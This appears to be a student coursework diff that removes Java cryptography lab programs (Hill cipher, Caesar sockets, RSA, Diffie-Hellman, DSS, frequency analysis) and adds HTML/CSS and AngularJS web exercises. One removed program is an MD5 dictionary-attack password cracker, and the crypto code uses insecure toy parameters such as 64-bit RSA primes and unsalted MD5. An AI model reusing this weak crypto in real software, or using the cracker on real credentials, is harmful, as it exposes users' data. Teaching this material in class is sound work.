@@ -1,923 +1,526 @@
-import java.util.*;
-public class hill_cipher {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML5 and CSS3 Example</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
 
-    public static void main(String[] args) {
-        Scanner in = new Scanner(System.in);
-        System.out.println("Enter plaintext:");
-        String plaint =in.nextLine();
+    <!-- Header Section -->
+    <header>
+        <nav>
+            <ul>
+                <li><a href="#">Home</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Services</a></li>
+                <li><a href="#">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
 
-        System.out.println("Enter key marix size nxn:");
-        int n = in.nextInt();
-        int key[][] = new int[n][n];
-        System.out.println("Enter values in key matrix:");
-        getkeymatrix(n,key);
+    <!-- Main Content -->
+    <main>
+        <!-- Section with Flexbox Layout -->
+        <section class="intro">
+            <h1>Welcome to Our Website</h1>
+            <p>This is an example of HTML5 and CSS3 features.</p>
+            <button class="cta-button">Learn More</button>
+        </section>
 
-        int[][] pt = new int[n][n];
-        int k=0;
-        for(int j =0;j<n;j++){
-            for(int i=0;i<n;i++){
-                pt[i][j] = plaint.charAt(k)-'A';
-                k++;
-            }
+        <!-- Article Section -->
+        <article>
+            <h2>HTML5 Semantic Elements</h2>
+            <p>HTML5 introduced new semantic elements for better structuring of content.</p>
+        </article>
 
-        }
-        System.out.println("corresponding plain text : ");
+        <!-- Section with Video -->
+        <section class="video-section">
+            <h2>Introduction Video</h2>
+            <video controls>
+                <source src="example-video.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </section>
 
-        for(int i =0;i<n;i++){
-            for(int j=0;j<n;j++){
-                System.out.print(pt[i][j]+" ");
-            }
-            System.out.println();
-        }
+        <!-- Form Section -->
+        <section class="form-section">
+            <h2>Contact Us</h2>
+            <form action="#" method="POST">
+                <label for="name">Name:</label>
+                <input type="text" id="name" name="name" required>
+                
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required>
+                
+                <label for="message">Message:</label>
+                <textarea id="message" name="message" required></textarea>
+                
+                <button type="submit">Submit</button>
+            </form>
+        </section>
 
-        int[][] ciphert = new int[n][n];
-        int[][] newpt = new int[n][n];
-        encrypt(ciphert,pt,key,n);
+        <!-- Section with Grid Layout -->
+        <section class="grid-section">
+            <div class="grid-container">
+                <div class="grid-item">Item 1</div>
+                <div class="grid-item">Item 2</div>
+                <div class="grid-item">Item 3</div>
+                <div class="grid-item">Item 4</div>
+            </div>
+        </section>
 
-        decrypt(ciphert,newpt,key,n);
+        <!-- Section with Box Shadow and Gradient -->
+        <section class="shadow-section">
+            <h2>CSS3 Features</h2>
+            <div class="shadow-box">
+                This box has a box shadow and gradient background.
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2024 Your Website. All rights reserved.</p>
+    </footer>
+
+</body>
+</html>
 
 
+
+
+
+
+
+/* Reset default styles */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+/* General Body Styles */
+body {
+    font-family: 'Arial', sans-serif;
+    line-height: 1.6;
+    background-color: #f4f4f4;
+    color: #333;
+}
+
+/* Header Navigation */
+header {
+    background-color: #333;
+    color: white;
+    padding: 1rem 0;
+}
+
+header nav ul {
+    display: flex;
+    justify-content: center;
+    list-style-type: none;
+}
+
+header nav ul li {
+    margin: 0 15px;
+}
+
+header nav ul li a {
+    color: white;
+    text-decoration: none;
+    font-size: 1.1rem;
+}
+
+header nav ul li a:hover {
+    text-decoration: underline;
+}
+
+/* Main Section */
+main {
+    padding: 20px;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+/* Flexbox Layout */
+.intro {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.intro h1 {
+    font-size: 2.5rem;
+    margin-bottom: 10px;
+}
+
+.intro p {
+    font-size: 1.2rem;
+    margin-bottom: 20px;
+}
+
+.cta-button {
+    padding: 10px 20px;
+    background-color: #007BFF;
+    color: white;
+    font-size: 1rem;
+    border: none;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.cta-button:hover {
+    background-color: #0056b3;
+}
+
+/* Article Styles */
+article {
+    background-color: #fff;
+    padding: 20px;
+    margin-bottom: 30px;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+article h2 {
+    font-size: 2rem;
+    margin-bottom: 10px;
+}
+
+article p {
+    font-size: 1rem;
+}
+
+/* Video Section */
+.video-section {
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.video-section video {
+    width: 100%;
+    max-width: 600px;
+    border-radius: 8px;
+}
+
+/* Form Section */
+.form-section {
+    background-color: #fff;
+    padding: 20px;
+    margin-bottom: 30px;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+.form-section label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 1.1rem;
+}
+
+.form-section input,
+.form-section textarea {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 1rem;
+}
+
+.form-section button {
+    padding: 10px 20px;
+    background-color: #28a745;
+    color: white;
+    font-size: 1.1rem;
+    border: none;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.form-section button:hover {
+    background-color: #218838;
+}
+
+/* Grid Section */
+.grid-section {
+    margin-bottom: 30px;
+}
+
+.grid-container {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 20px;
+}
+
+.grid-item {
+    background-color: #fff;
+    padding: 20px;
+    text-align: center;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+/* Shadow and Gradient Section */
+.shadow-section {
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.shadow-box {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff7e5f, #feb47b);
+    color: white;
+    padding: 40px;
+    border-radius: 10px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    font-size: 1.2rem;
+}
+
+/* Footer Styles */
+footer {
+    background-color: #333;
+    color: white;
+    text-align: center;
+    padding: 1rem;
+    position: fixed;
+    width: 100%;
+    bottom: 0;
+}
+
+footer p {
+    margin: 0;
+}
+
+/* Media Query for Mobile Devices */
+@media (max-width: 768px) {
+    .grid-container {
+        grid-template-columns: repeat(2, 1fr);
     }
 
-    static void decrypt(int[][] ct,int[][] npt,int[][] key,int n){
-
-        int kinv[][] ;
-
-        kinv = keyinverse(key,26);
-        System.out.println("Key inverse matrix : ");
-
-        for(int i =0;i<n;i++){
-            for(int j=0;j<n;j++){
-                System.out.print(kinv[i][j]+" ");
-            }
-            System.out.println();
-        }
-
-
-
-
-        for (int i =0;i<n;i++){
-            for (int j=0;j<n;j++){
-                int sum=0;
-                for(int k =0;k<n;k++){
-                    sum+=(kinv[i][k]*ct[k][j]);
-                }
-                npt[i][j] = sum%26;
-            }
-        }
-
-        System.out.println("plain text after decryption  : ");
-
-        for(int i =0;i<n;i++){
-            for(int j=0;j<n;j++){
-                System.out.print(npt[i][j]+" ");
-            }
-            System.out.println();
-        }
-
-        System.out.println();
-        for(int j =0;j<n;j++){
-            for(int i=0;i<n;i++){
-                System.out.print((char)(npt[i][j]+65)+"");
-            }
-
-        }
-
-
-
-
-    }
-    static void getCofactor(int[][] matrix, int[][] temp, int p, int q, int n) {
-        int i = 0, j = 0;
-
-        for (int row = 0; row < n; row++) {
-            for (int col = 0; col < n; col++) {
-                if (row != p && col != q) {
-                    temp[i][j++] = matrix[row][col];
-                    if (j == n - 1) {
-                        j = 0;
-                        i++;
-                    }
-                }
-            }
-        }
-    }
-
-    // Function to calculate the determinant of the matrix
-    static int determinant(int[][] matrix, int n) {
-        int det = 0;
-        if (n == 1)
-            return matrix[0][0];
-
-        int[][] temp = new int[n][n];
-        int sign = 1;
-
-        for (int f = 0; f < n; f++) {
-            getCofactor(matrix, temp, 0, f, n);
-            det += sign * matrix[0][f] * determinant(temp, n - 1);
-            det = ((det % 26) + 26) % 26;
-            sign = -sign;
-        }
-
-        return det;
-    }
-
-    // Function to find the modular inverse of a under modulo m
-    static int modInverse(int a, int m) {
-        a = a % m;
-        for (int x = 1; x < m; x++) {
-            if ((a * x) % m == 1) {
-                return x;
-            }
-        }
-        return -1; // In case the inverse does not exist
-    }
-
-    // Function to get the adjoint of the matrix
-    static void adjoint(int[][] matrix, int[][] adjoint) {
-        int n = matrix.length;
-        if (n == 1) {
-            adjoint[0][0] = 1;
-            return;
-        }
-
-        int sign;
-        int[][] temp = new int[n][n];
-
-        for (int i = 0; i < n; i++) {
-            for (int j = 0; j < n; j++) {
-                getCofactor(matrix, temp, i, j, n);
-                sign = ((i + j) % 2 == 0) ? 1 : -1;
-                adjoint[j][i] = (sign * determinant(temp, n - 1)) % 26;
-                adjoint[j][i] = ((adjoint[j][i] % 26) + 26) % 26;
-            }
-        }
-    }
-
-    // Function to invert the matrix modulo 26
-    static int[][] keyinverse(int[][] matrix, int mod) {
-        int n = matrix.length;
-        int det = determinant(matrix, n);
-        int detInv = modInverse(det, mod);
-
-        if (detInv == -1) {
-            return null; // Matrix is not invertible
-        }
-
-        int[][] adj = new int[n][n];
-        adjoint(matrix, adj);
-
-        int[][] inverse = new int[n][n];
-        for (int i = 0; i < n; i++) {
-            for (int j = 0; j < n; j++) {
-                inverse[i][j] = (adj[i][j] * detInv) % mod;
-                inverse[i][j] = (inverse[i][j] + mod) % mod; // Ensure non-negative
-            }
-        }
-
-        return inverse;
-    }
-    static  void encrypt(int[][] ct,int[][] pt,int[][] key,int n){
-
-        for (int i =0;i<n;i++){
-            for (int j=0;j<n;j++){
-                int sum=0;
-                for(int k =0;k<n;k++){
-                     sum+=(key[i][k]*pt[k][j]);
-                }
-                ct[i][j] = sum%26;
-            }
-        }
-
-        System.out.println("corresponding ciphertext : ");
-
-        for (int i =0;i<n;i++){
-            for (int j=0;j<n;j++){
-                System.out.print(ct[i][j]+" ");
-            }
-            System.out.println();
-        }
-    }
-
-    static void getkeymatrix(int n,int[][] key){
-        Scanner in = new Scanner(System.in);
-        for(int i=0;i<n;i++){
-            for(int j=0;j<n;j++){
-                key[i][j] = in.nextInt();
-            }
-            System.out.println();
-        }
+    .intro {
+        flex-direction: column;
     }
 }
 
 
 
 
-
-
-
-
-
-import java.io.*;
-import java.net.*;
-import java.util.Scanner;
-
-public class cclient{
-    public static void main(String[] args) throws Exception{
-        Socket cs = new Socket("localhost",8080);
-        BufferedReader infserver=new BufferedReader(new InputStreamReader(cs.getInputStream()));
-        Scanner in=new Scanner(System.in);
-        PrintWriter infts=new PrintWriter(cs.getOutputStream(),true);
-        System.out.println("Enter msg:");
-        String msg=in.nextLine();
-        infts.println(encrypt(msg, 3));
-
-    }
-    static String encrypt(String pt,int key){
-        StringBuilder et=new StringBuilder();
-        key=key%26;
-        if (key<0){
-            key+=26;
-        }
-        for(int i=0;i<pt.length();i++){
-            char ch=pt.charAt(i);
-            if(Character.isLetter(ch)){
-                char base=Character.isLowerCase(ch)?'a':'A';
-                char e=(char)((ch+key-base)%26+base);
-                et.append(e);
-            }
-            else{
-                et.append(ch);
-            }
-        }
-        return et.toString();
-    }
-}
-
-
-
-
-
-
-
-
-
-import java.io.*;
-import java.net.*;
-import java.util.Scanner;
-
-public class cserver{
-    public static void main(String[] args) throws Exception{
-        ServerSocket ss=new ServerSocket(8080);
-        Socket cs = ss.accept();
-        BufferedReader infclient=new BufferedReader(new InputStreamReader(cs.getInputStream()));
-        Scanner in=new Scanner(System.in);
-        PrintWriter inftc=new PrintWriter(cs.getOutputStream(),true);
-        String msg=infclient.readLine();
-        System.out.println(encrypt(msg, -3));
-    }
-    static String encrypt(String pt,int key){
-        StringBuilder et=new StringBuilder();
-        key=key%26;
-        if (key<0){
-            key+=26;
-        }
-        for(int i=0;i<pt.length();i++){
-            char ch=pt.charAt(i);
-            if(Character.isLetter(ch)){
-                char base=Character.isLowerCase(ch)?'a':'A';
-                char e=(char)((ch+key-base)%26+base);
-                et.append(e);
-            }
-            else{
-                et.append(ch);
-            }
-        }
-        return et.toString();
-    }
-}
-
-
-
-
-
-
-
-
-
-import java.math.BigInteger;
-import java.security.SecureRandom;
-
-
-public class rsa{
-    public static void main(String[] args){
-        String msg="Hi da kena punda";
-        Keypair kp=keygen();
-        BigInteger e=kp.e;
-        BigInteger d=kp.d;
-        BigInteger n=kp.n;
-
-        BigInteger pt=new BigInteger(msg.getBytes());
-        BigInteger enc=encrypt(pt,e,n);
-        System.out.println("Enc:"+enc);
-        BigInteger dec=decrypt(enc,d,n);
-        System.out.println("Dec:"+new String(dec.toByteArray()));
-    }
-
-    static BigInteger encrypt(BigInteger pt, BigInteger e, BigInteger n){
-        return pt.modPow(e, n);
-    }
-
-    static BigInteger decrypt(BigInteger pt, BigInteger d, BigInteger n){
-        return pt.modPow(d, n);
-    }
-
-    static Keypair keygen(){
-        SecureRandom r=new SecureRandom();
-        BigInteger p=BigInteger.probablePrime(64, r);
-        BigInteger q=BigInteger.probablePrime(64, r);
-        BigInteger n=p.multiply(q);
-        BigInteger pi=(p.subtract(BigInteger.ONE)).multiply(q.subtract(BigInteger.ONE));
-        BigInteger e=BigInteger.probablePrime(64,r);
-        while(e.compareTo(BigInteger.ONE)<=0 || !pi.gcd(e).equals(BigInteger.ONE)){
-            e=e.add(BigInteger.ONE);
-        }
-        BigInteger d = e.modInverse(pi);
-        return new Keypair(n,e,d);
-    }
-}
-
-class Keypair{
-    public final BigInteger e;
-    public final BigInteger d;
-    public final BigInteger n;
-    public Keypair(BigInteger n, BigInteger e, BigInteger d){
-        this.e=e;
-        this.n=n;
-        this.d=d;
-    }
-}
-
-
-
-
-
-
-
-import java.util.*;
-import java.security.*;
-import java.io.*;
-public class dict {
-    public static void main(String[] args) {
-        Scanner sc=new Scanner(System.in);
-        String pass=sc.nextLine();
-        try{
-        Scanner file=new Scanner(new File("pass.txt"));
-        while(file.hasNextLine()){
-            String has=file.nextLine();
-            has=hash(has);
-            if(pass.equals(has)){
-                System.out.println("password found ");
-                return;
-            }
-            System.out.println("no password");
-            System.out.println(has);
-        }
-    }catch(Exception e){}
-}
-    public static String hash(String p) {
-        try{
-        MessageDigest md=MessageDigest.getInstance("MD5");
-        byte[] hashbyte=md.digest(p.getBytes());
-        StringBuilder sb=new StringBuilder();
-        for(byte b:hashbyte){
-            sb.append(String.format("%02x",b));
-        }
-        return sb.toString();
-        }
-        catch(NoSuchAlgorithmException e){}
-        return null;
-    }
-}
-
-
-import java.util.*;
-import java.security.MessageDigest;
-import java.security.NoSuchAlgorithmException;
-
-public class Dict {
-    private static Map<String, String> passwordTable = new HashMap<>();
-    private static List<String> dictionary = new ArrayList<>();
-
-    public static void main(String[] args) {
-        Scanner scanner = new Scanner(System.in);
-        int choice;
-        do {
-            System.out.println("Menu:");
-            System.out.println("1. Create Dictionary");
-            System.out.println("2. Create Password Table");
-            System.out.println("3. Display Password Table");
-            System.out.println("4. Launch Dictionary Attack");
-            System.out.println("5. Exit");
-            System.out.print("Enter your choice: ");
-            choice = scanner.nextInt();
-            scanner.nextLine(); // Consume newline
-
-            switch (choice) {
-                case 1:
-                    createDictionary(scanner);
-                    break;
-                case 2:
-                    createPasswordTable(scanner);
-                    break;
-                case 3:
-                    displayPasswordTable();
-                    break;
-                case 4:
-                    launchDictionaryAttack(scanner);
-                    break;
-                case 5:
-                    System.out.println("Exiting...");
-                    break;
-                default:
-                    System.out.println("Invalid choice. Please try again.");
-            }
-        } while (choice != 5);
-        scanner.close();
-    }
-
-    private static void createDictionary(Scanner scanner) {
-        System.out.print("Enter 'alphabets' or 'numerals': ");
-        String type = scanner.nextLine().toLowerCase();
-        System.out.print("Enter the length: ");
-        int length = scanner.nextInt();
-        scanner.nextLine(); // Consume newline
-
-        dictionary.clear();
-        generateDictionaryEntries(type, length, "");
-
-        System.out.println("Dictionary created with " + dictionary.size() + " entries.");
-    }
-
-    private static void generateDictionaryEntries(String type, int length, String prefix) {
-        if (length == 0) {
-            dictionary.add(prefix);
-            return;
-        }
-        char start = (type.equals("alphabets")) ? 'a' : '0';
-        char end = (type.equals("alphabets")) ? 'z' : '9';
-        for (char c = start; c <= end; c++) {
-            generateDictionaryEntries(type, length - 1, prefix + c);
-        }
-    }
-
-    private static void createPasswordTable(Scanner scanner) {
-        System.out.print("Enter username: ");
-        String username = scanner.nextLine();
-        System.out.print("Enter password: ");
-        String password = scanner.nextLine();
-
-        passwordTable.put(username, hashMD5(password));
-        System.out.println("Password table updated.");
-    }
-
-    private static void displayPasswordTable() {
-        System.out.println("Password Table (MD5 Hashed):");
-        for (Map.Entry<String, String> entry : passwordTable.entrySet()) {
-            System.out.println("Username: " + entry.getKey() + ", Password: " + entry.getValue());
-        }
-    }
-
-    private static void launchDictionaryAttack(Scanner scanner) {
-        System.out.print("Enter username: ");
-        String username = scanner.nextLine();
-
-        if (!passwordTable.containsKey(username)) {
-            System.out.println("Username not found.");
-            return;
-        }
-
-        String hashedPassword = passwordTable.get(username);
-        for (String entry : dictionary) {
-            if (hashMD5(entry).equals(hashedPassword)) {
-                System.out.println("Password found for username '" + username + "': " + entry);
-                return;
-            }
-        }
-        System.out.println("Password not found in dictionary.");
-    }
-
-    private static String hashMD5(String input) {
-        try {
-            MessageDigest md = MessageDigest.getInstance("MD5");
-            byte[] messageDigest = md.digest(input.getBytes());
-            StringBuilder sb = new StringBuilder();
-            for (byte b : messageDigest) {
-                sb.append(String.format("%02x", b));
-            }
-            return sb.toString();
-        } catch (NoSuchAlgorithmException e) {
-            throw new RuntimeException(e);
-        }
-    }
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-import java.util.Scanner;
-
-public class SHA {
-
-    public static int rotateLeft(int value, int bits) {
-        return (value << bits) | (value >>> (32 - bits));
-    }
-
-    public static void sha1Step(int a, int b, int c, int d, int e, int w) {
-
-        int f;
-        int k;
-
-        f = (b & c) | (~b & d);
-        k = 0x5A827999;
-
-
-        int temp = rotateLeft(a, 5) + f + e + k + w;
-        e = d;
-        d = c;
-        c = rotateLeft(b, 30);
-        b = a;
-        a = temp;
-
-        System.out.println("Updated values:");
-        System.out.println("a: " + String.format("%02x", a));
-        System.out.println("b: " + String.format("%02x", b));
-        System.out.println("c: " + String.format("%02x", c));
-        System.out.println("d: " + String.format("%02x", d));
-        System.out.println("e: " + String.format("%02x", e));
-    }
-
-    public static void main(String[] args) {
-        Scanner scanner = new Scanner(System.in);
-
-        System.out.print("Enter value for w (hex): ");
-        int w = (int)Long.parseLong(scanner.nextLine(), 16);
-
-        System.out.print("Enter value for a (hex): ");
-        int a = (int)Long.parseLong(scanner.nextLine(), 16);
-
-        System.out.print("Enter value for b (hex): ");
-        int b = (int)Long.parseLong(scanner.nextLine(), 16);
-
-        System.out.print("Enter value for c (hex): ");
-        int c = (int)Long.parseLong(scanner.nextLine(), 16);
-
-        System.out.print("Enter value for d (hex): ");
-        int d =(int)Long.parseLong(scanner.nextLine(), 16);
-
-        System.out.print("Enter value for e (hex): ");
-        int e = (int)Long.parseLong(scanner.nextLine(), 16);
-
+formcontrol.html
+
+HTML Form Controls
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Grouping Form Controls in HTML</title>
+</head>
+<body>
+    <form>
+        <fieldset>
+            <legend>Name</legend>            
+            Firstname: <input type="text" name="firstname">            
+            Lastname: <input type="text" name="lastname">
+        </fieldset>
+        <fieldset>
+            <legend>Gender</legend>            
+            <input type="radio" name="gender" value="male"> Male           
+           <input type="radio" name="gender" value="female"> Female
+        </fieldset>
+        <fieldset>
+        	<legend>Hobbies</legend>            
+            <input type="checkbox" name="hobbies" value="soccer"> Soccer
+           <input type="checkbox" name="hobbies" value="cricket"> Cricket
+            <input type="checkbox" name="hobbies" value="baseball"> Baseball
+        </fieldset>
+        <fieldset>
+            <legend>Contact Details</legend>
+           Email Address: <input type="email" name="email">
+            Phone Number: <input type="text" name="phone">
+        </fieldset>
+      <fieldset>
         
-        sha1Step(a, b, c, d, e, w);
-
-        scanner.close();
-    }
-}
-
-
-
-
-
-
-
-
-
-import java.io.*;
-import java.math.BigInteger;
-import java.net.*;
-import java.security.SecureRandom;
-
-public class DHClient {
-
-
-    public static void main(String[] args) throws Exception {
-        Socket cs = new Socket("localhost", 8080);
-        PrintWriter out = new PrintWriter(cs.getOutputStream(), true);
-        BufferedReader in = new BufferedReader(new InputStreamReader(cs.getInputStream()));
-
-        BigInteger P = new BigInteger(in.readLine());
-        BigInteger G = new BigInteger(in.readLine());
-        BigInteger sPuk = new BigInteger(in.readLine());
-
-        System.out.println("Large Prime : "+P);
-        System.out.println("Generator : "+G);
-
-        SecureRandom r = new SecureRandom();
-        BigInteger cPrk = new BigInteger(15, r);
-        BigInteger cPuk = G.modPow(cPrk, P);
-
-            out.println(cPuk.toString());
-
-            BigInteger sharedSecret = sPuk.modPow(cPrk, P);
-
-            System.out.println("Client's public key: " + cPuk);
-            System.out.println("Server's public key: " + sPuk);
-            System.out.println("Shared secret: " + sharedSecret);
-
-    }
-}
-
-
-
-import java.io.*;
-import java.math.BigInteger;
-import java.net.*;
-import java.security.SecureRandom;
-
-public class DHServer {
-
-    public static void main(String[] args) throws Exception{
-             ServerSocket ss = new ServerSocket(8080);
-             Socket cs = ss.accept();
-             BufferedReader in = new BufferedReader(new InputStreamReader(cs.getInputStream()));
-             PrintWriter out = new PrintWriter(cs.getOutputStream(), true);
-
-            SecureRandom r = new SecureRandom();
-            BigInteger p = BigInteger.probablePrime(16, r);
-            BigInteger g = findSmallestGenerator(p);
-
-            BigInteger sPrk = new BigInteger(15, r);
-            BigInteger sPuk = g.modPow(sPrk, p);
-
-            out.println(p.toString());
-            out.println(g.toString());
-            out.println(sPuk.toString());
-            System.out.println("public key send to client:"+sPuk);
-
-            BigInteger cPuk = new BigInteger(in.readLine());
-            BigInteger sharedSecret = cPuk.modPow(sPrk, p);
-            System.out.println("public key received from client:"+cPuk);
-            System.out.println("Shared secret: " + sharedSecret);
-
-        }
-
-
-    private static BigInteger findSmallestGenerator(BigInteger p) {
-        for (BigInteger g = BigInteger.TWO; g.compareTo(p) < 0; g = g.add(BigInteger.ONE)) {
-            if (isGenerator(g, p)) {
-                return g;
-            }
-        }
-        return BigInteger.ZERO;
-    }
-
-    private static boolean isGenerator(BigInteger g, BigInteger p) {
-        boolean[] residues = new boolean[p.intValue()];
-        BigInteger value = BigInteger.ONE;
-        for (int i = 0; i < p.intValue() - 1; i++) {
-            value = value.multiply(g).mod(p);
-            if (residues[value.intValue()]) return false;
-            residues[value.intValue()] = true;
-        }
-        return true;
-    }
-}
-
-
-
-
-
-import java.util.*;
-
-public class FrequencyAnalysis {
-
-    private static final String ALPHABET = "abcdefghijklmnopqrstuvwxyz";
-    private static final String FREQUENCY_ORDER = "etaoinshrdlcumwfgypbvkjxqz"; 
-
-    public static void main(String[] args) {
-        Scanner scanner = new Scanner(System.in);
-        System.out.print("Enter the Cipher Text: ");
-        String ciphertext = scanner.nextLine();
-        ciphertext = ciphertext.toLowerCase();
-        frequencyAnalysis(ciphertext);
-        System.out.println("Thirumalai_22IT120");
-    }
-
-    public static void frequencyAnalysis(String text) {
-        Map<Character, Integer> frequencyMap = new HashMap<>();
-        for (char c : text.toCharArray()) {
-            if (Character.isLetter(c)) {
-                frequencyMap.put(c, frequencyMap.getOrDefault(c, 0) + 1);
-            }
-        }
-
-        System.out.println("Character Frequencies:");
-        for (Map.Entry<Character, Integer> entry : frequencyMap.entrySet()) {
-            System.out.println(entry.getKey() + ": " + entry.getValue());
-        }
-
+        <legend>City<legend>
+      <select name="city" id="city">
+        <option value="1">chennai</option>
+        <option value="2">Madurai</option>
+        <option value="3">Coimbatore</option>
+    </select>
         
-        char mostFrequentChar = Collections.max(frequencyMap.entrySet(), Map.Entry.comparingByValue()).getKey();
+     </fieldset>
+       Address :   <textarea rows="3" cols="30" name="address" id="address"></textarea><hr>
+      <input type="submit" value="Submit">
+    <input type="reset" value="Reset">
+    </form>
+</body>
+</html>
 
-        System.out.println("Possible Decryptions:");
-        Scanner s = new Scanner(System.in);
-        for (char frequentChar : FREQUENCY_ORDER.toCharArray()) {
-            int shift = mostFrequentChar - frequentChar;
-            System.err.println("Trying key value: " + shift);
-            System.out.println(decryptUsingShift(text, shift));
-            System.err.println("Is that correct (y/n)?");
-            char in = s.next().charAt(0);
-            if (in == 'y') {
-                return;
-            }
-        }
-    }
 
-    public static String decryptUsingShift(String cipherText, int shiftKey) {
-        final String ALPHABET = "abcdefghijklmnopqrstuvwxyz";
-        cipherText = cipherText.toLowerCase();
-        StringBuilder plainText = new StringBuilder();
 
-        for (int i = 0; i < cipherText.length(); i++) {
-            char currentChar = cipherText.charAt(i);
-            if (currentChar == ' ') {
-                plainText.append(' ');
-            } else if (Character.isLetter(currentChar)) {
-                int charPosition = ALPHABET.indexOf(currentChar);
-                int keyVal = (charPosition - shiftKey) % 26;
-                if (keyVal < 0) {
-                    keyVal = ALPHABET.length() + keyVal;
-                }
-                char replaceVal = ALPHABET.charAt(keyVal);
-                plainText.append(replaceVal);
-            } else {
-                plainText.append(currentChar);
-            }
-        }
 
-        return plainText.toString();
-    }
+webservice:
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head> <meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>AngularJS Web Service Example</title>
+
+<script
+src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+
+</head>
+
+<body ng-app="myApp" ng-controller="MainController">
+
+<h1>User List</h1>
+
+<ul> <li ng-repeat="user in users">
+
+{{ user.name }} - {{ user.email }}
+
+</li> </ul>
+
+<script>
+
+var app = angular.module('myApp', []);
+
+app.controller('MainController', function($scope, $http) {
+
+// Using the $http service to fetch data from a web service
+
+$http.get('https://jsonplaceholder.typicode.com/users')
+
+.then(function(response) {
+
+// Assign the fetched data to the users array
+
+$scope.users = response.data;
+
+}, function(error) {
+
+console.error('Error fetching user data:', error);
+
+});
+
+});
+
+</script>
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+soap with js:
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>AngularJS SOAP Example</title>
+
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+
+<script src="app.js"></script>
+
+</head>
+
+<body ng-app="soapApp" ng-controller="SoapController">
+
+<h1>SOAP API: Get Stock Price</h1>
+
+<p>Enter Stock Symbol:</p>
+
+<input type="text" ng-model="stockSymbol" placeholder="Enter Stock Symbol">
+
+<button ng-click="getStockPrice()">Get Price</button>
+
+<p ng-if="stockPrice">Stock Price: {{ stockPrice }}</p>
+
+</body>
+
+</html>
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+var app = angular.module('soapApp', []);
+
+app.controller('SoapController', function($scope, $http) {
+
+$scope.stockSymbol = "";
+
+$scope.stockPrice = null;
+
+$scope.getStockPrice = function() {
+
+var soapMessage =
+
+`<?xml version="1.0" encoding="utf-8"?>
+
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
+
+soap:encodingStyle="http://www.w3.org/2003/05/soap-encoding">
+
+<soap:Body xmlns:m="http://www.example.org/stock">
+
+<m:GetStockPrice>
+
+<m:StockSymbol>${$scope.stockSymbol}</m:StockSymbol>
+
+</m:GetStockPrice>
+
+</soap:Body>
+
+</soap:Envelope>`;
+
+$http.post('https://www.w3schools.com/xml/tempconvert.asmx', soapMessage, {
+
+headers: {
+
+'Content-Type': 'application/soap+xml; charset=utf-8'
+
 }
 
+}).then(function(response) {
 
+var parser = new DOMParser();
 
+var xmlDoc = parser.parseFromString(response.data, "text/xml");
 
-import java.math.BigInteger;
-import java.security.MessageDigest;
-import java.security.SecureRandom;
-import java.util.Scanner;
+var priceElement = xmlDoc.getElementsByTagName("m:Price")[0];
 
-public class DSS {
+if (priceElement) {
 
-    private static BigInteger p, q, g, x, y, k, r, s;
-    private static SecureRandom random = new SecureRandom();
+$scope.stockPrice = priceElement.childNodes[0].nodeValue;
 
-    public static void computeGenerator() {
-        BigInteger h;
-        do {
-            h = new BigInteger(q.bitLength(), random);
-        } while (h.compareTo(BigInteger.ONE) <= 0 || h.compareTo(p.subtract(BigInteger.ONE)) >= 0);
+} else {
 
-        g = h.modPow(p.subtract(BigInteger.ONE).divide(q), p); // g = h^((p-1)/q) mod p
-    }
+$scope.stockPrice = "Price not found.";
 
-    // Generate parameters for DSA
-    public static void generateParameters() {
-        Scanner sc = new Scanner(System.in);
-
-        System.out.println("Enter prime p: ");
-        p = new BigInteger(sc.nextLine());
-
-        System.out.println("Enter prime q (divisor of p-1): ");
-        q = new BigInteger(sc.nextLine());
-
-        // Compute g based on p and q
-        computeGenerator();
-
-        // Generate private key x and public key y
-        x = new BigInteger(q.bitLength(), random).mod(q); // Private key x < q
-        y = g.modPow(x, p);  // Public key y = g^x mod p
-
-        System.out.println("Generated parameters:");
-        System.out.println("p = " + p);
-        System.out.println("q = " + q);
-        System.out.println("g = " + g);
-        System.out.println("Private key x: " + x);
-        System.out.println("Public key y: " + y);
-    }
-
-    // Hash function to hash the message using SHA-1
-    public static BigInteger hashMessage(String message) throws Exception {
